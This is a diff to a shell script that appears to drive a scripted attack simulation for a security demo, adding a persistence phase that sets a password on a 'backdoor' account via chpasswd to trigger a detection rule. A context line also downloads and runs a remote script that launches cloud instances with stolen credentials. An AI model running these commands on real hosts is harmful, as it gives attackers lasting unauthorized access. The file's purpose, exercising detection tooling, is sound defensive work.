@@ -359,7 +359,24 @@ wait_for_confirmation
 exploit "curl -O ${RAW_BASE}/assets/cloud-access/run-instances-with-creds.sh && chmod +x run-instances-with-creds.sh && ./run-instances-with-creds.sh"
 
 # ----------------------------------------------------------------------------
-# Phase 5 - Cleanup
+# Phase 5 - Persistence via account manipulation
+# ----------------------------------------------------------------------------
+step <<EOF
+${PURPLE}Persistence - Set a backdoor account password to lock in access${NC}
+
+${PURPLE}On top of the SSH key and rc.common persistence planted with the
+malware, the attacker sets the password on a backdoor account (via chpasswd),
+keeping an independent way back into the host even if the initial RCE is
+patched and the miner is cleaned up. Manipulating an account's credentials
+this way is textbook account-manipulation persistence (MITRE T1098) and trips
+a default Workload Protection rule the moment the passwd tooling runs.${NC}
+EOF
+wait_for_confirmation
+exploit "echo 'backdoor:S3curity-Playground-Demo!' | /usr/sbin/chpasswd || true; echo DONE"
+
+
+# ----------------------------------------------------------------------------
+# Phase 6 - Cleanup
 # ----------------------------------------------------------------------------
 step <<EOF
 ${PURPLE}Cleanup - Remove attack artifacts${NC}
